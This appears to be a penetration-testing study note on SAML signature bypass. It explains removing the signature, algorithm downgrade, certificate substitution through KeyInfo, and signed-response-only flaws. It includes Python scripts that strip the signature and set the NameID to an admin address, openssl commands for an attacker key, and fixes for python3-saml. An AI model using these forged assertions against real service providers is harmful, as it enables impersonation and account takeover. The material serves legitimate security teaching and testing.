---
tags: [vapt, saml, advanced]
difficulty: advanced
module: "20 - SAML"
topic: "20.08 SAML Signature Bypass (none algorithm)"
---

# 20.08 — SAML Signature Bypass (none algorithm)

## The Signature Bypass Idea

```
SAML USES XML DIGITAL SIGNATURE:
  Assertion is signed by IdP's private key
  SP verifies using IdP's public key (configured at SP)
  
  BYPASS APPROACH:
  What if we can make the SP not validate the signature at all?
  
  OR: Remove/replace the signature and still get accepted?
  
  ANALOG TO JWT alg=none:
  JWT: Change algorithm to "none" → no signature needed
  SAML: Equivalent attacks exist for different scenarios
```

---

## Attack 1: Remove Signature Entirely

```
SIMPLEST APPROACH:
  Delete the entire <ds:Signature> element
  Modify NameID/attributes to anything
  Submit
  
  ORIGINAL:
  <saml:Assertion ID="_abc">
    <ds:Signature>...</ds:Signature>
    <saml:NameID>attacker@evil.com</saml:NameID>
  </saml:Assertion>
  
  MODIFIED (no signature):
  <saml:Assertion ID="_abc">
    <saml:NameID>admin@company.com</saml:NameID>
  </saml:Assertion>
  
  IF SP DOESN'T REQUIRE SIGNATURE:
  → Accepts modified assertion!
  → Any identity, any attributes!
  
  WHY THIS HAPPENS:
  - Developer error: signature validation code has exception path
  - "Optional" signature configured by mistake
  - Library with bug that skips validation
  - Misconfigured SP that trusts unsigned assertions from "known IPs"
```

---

## Attack 2: Signature Algorithm Downgrade

```
SAML SIGNATURE ALGORITHMS:
  http://www.w3.org/2000/09/xmldsig#rsa-sha1    (OLD, weak)
  http://www.w3.org/2001/04/xmldsig-more#rsa-sha256  (current)
  http://www.w3.org/2001/04/xmldsig-more#rsa-sha512  (strong)
  
  ALSO: HMAC variants (less common in SAML)
  
ATTACK:
  Change algorithm to weaker one the SP still accepts
  If SP accepts SHA1 signatures:
  → Weaker collision resistance → harder to exploit but worth noting
  
  More relevant: if SP doesn't enforce algorithm:
  → Try removing algorithm attribute entirely
  → Try putting "none" as algorithm value
  → Try invalid algorithm name → does SP throw error or skip?
```

---

## Attack 3: Certificate Substitution

```
EACH SP CONFIGURES TRUSTED CERTIFICATE FROM IDP:
  SP stores: IdP's X.509 certificate (public key)
  Uses it to verify signatures
  
ATTACK SCENARIO:
  SP is misconfigured to accept ANY certificate embedded in the assertion
  (vs: using pre-configured IdP cert)
  
  PAYLOAD:
  Attacker generates their own RSA key pair
  Signs assertion with their private key
  Embeds their PUBLIC CERT in <ds:KeyInfo>:
  
  <ds:KeyInfo>
    <ds:X509Certificate>ATTACKER_CERT_BASE64</ds:X509Certificate>
  </ds:KeyInfo>
  
  IF SP USES THE KEY FROM KeyInfo TO VERIFY (vs pre-configured):
  → Attacker's cert → attacker's public key → verifies attacker's signature!
  → Assertion accepted!
  
  THIS IS EQUIVALENT TO JWT jwk injection!
  
  TESTING:
  1. Generate RSA key pair (openssl genrsa 2048)
  2. Sign modified assertion with private key
  3. Embed public cert in assertion's KeyInfo
  4. Submit → did SP accept?
  
  SOME SAML LIBRARIES HAVE DONE THIS (incorrectly)
  "Trust the key in the assertion" is WRONG
  Should use pre-registered IdP certificate only!
```

---

## Attack 4: Signature on Response but Not Assertion

```
STRUCTURE ISSUE:
  Sometimes: Response is signed, but inner Assertion is NOT signed separately
  
  IF SP only validates Response signature (not Assertion signature):
  → Signature is valid for the Response wrapper
  → But: Assertion INSIDE is unsigned!
  
  ATTACK (requires MITM or ability to modify):
  Original: [Response]signed → [Assertion]unsigned inside
  
  Intercept → replace Assertion inside → Response signature breaks
  
  BUT: If SP is lazy and only checks Response-level signature...
  In some cases the outer sig on Response can be valid but inner content replaced
  (This is a specific SAML implementation bug)
  
RULE:
  Both Response AND Assertion should be signed
  SP should prefer Assertion-level signature (tighter scope)
  Or require both signatures to be valid
```

---

## Testing Signature Validation

```bash
# TEST 1: REMOVE SIGNATURE
python3 << 'EOF'
import base64, re

saml_b64 = "YOUR_VALID_SAML_BASE64"
xml = base64.b64decode(saml_b64).decode()

# Remove signature block:
xml_no_sig = re.sub(r'<ds:Signature[^>]*>.*?</ds:Signature>', '', xml, flags=re.DOTALL)

# Modify NameID:
xml_modified = xml_no_sig.replace(
    'your@email.com',
    'admin@company.com'
)

print(base64.b64encode(xml_modified.encode()).decode())
EOF

# Submit and check if accepted!

# TEST 2: MODIFY NAMEID KEEPING SIGNATURE (should fail on properly implemented SP)
python3 << 'EOF'
import base64

saml_b64 = "YOUR_VALID_SAML_BASE64"
xml = base64.b64decode(saml_b64).decode()

# Just modify NameID (signature will be invalid):
xml_modified = xml.replace(
    '<saml:NameID Format="...">your@email.com</saml:NameID>',
    '<saml:NameID Format="...">admin@company.com</saml:NameID>'
)

print(base64.b64encode(xml_modified.encode()).decode())
EOF
# → SP should REJECT (signature mismatch)
# → If SP ACCEPTS → CRITICAL: signature not validated at all!

# TEST 3: SAML RAIDER "Remove Signature" BUTTON
# Install SAML Raider → Burp extension
# Find assertion → "XML" tab → click "Remove Signature"
# → Modify NameID → "Send" → check response

# TEST 4: CERTIFICATE SUBSTITUTION
# Generate new key pair:
openssl genrsa -out attacker.key 2048
openssl req -new -x509 -key attacker.key -out attacker.crt -days 365 -subj "/CN=attacker"
# → Sign assertion with attacker.key, embed attacker.crt in KeyInfo
# → Submit, check if accepted
```

---

## Fix

```
PREVENTING SIGNATURE BYPASS:

1. ALWAYS REQUIRE SIGNATURE (never optional):
   # Configuration: SP must require signed assertions!
   # python3-saml settings:
   {
     "security": {
       "wantAssertionsSigned": True,    # ← REQUIRE it!
       "wantMessagesSigned": False,     # optional at response level
     }
   }

2. USE PRE-REGISTERED IDP CERTIFICATE ONLY:
   Store: IdP's certificate at SP setup time
   NEVER: trust KeyInfo in the assertion
   
   # python3-saml:
   {
     "idp": {
       "x509cert": "HARDCODED_IDP_CERT_HERE",  # pre-registered
     }
   }

3. VALIDATE ALGORITHM EXPLICITLY:
   Reject weak algorithms (MD5, SHA1)
   Require at least RSA-SHA256

4. ENFORCE SIGNATURE ON ASSERTION (not just Response):
   Even if Response is signed, verify Assertion signature separately

5. USE MAINTAINED LIBRARIES:
   python3-saml, ruby-saml, OpenSAML
   These handle signature validation correctly by default
   Keep them updated!

6. SAML SECURITY CHECKLIST:
   □ wantAssertionsSigned = true
   □ wantMessagesSigned = true (response level)
   □ Certificate pre-configured (not from assertion)
   □ Algorithm allowlist (SHA256+)
   □ Signature required (not optional)
```

---

## Related Notes
- [[03 - XML Signature Wrapping (XSW) Attacks]] — bypassing via XML tricks
- [[05 - SAML Attribute Manipulation]] — modifying attributes after bypass
- [[09 - SAML to Account Takeover]] — full attack chains
- [[10 - Defense — Strict Schema Validation, Signed Assertions]] — full fix
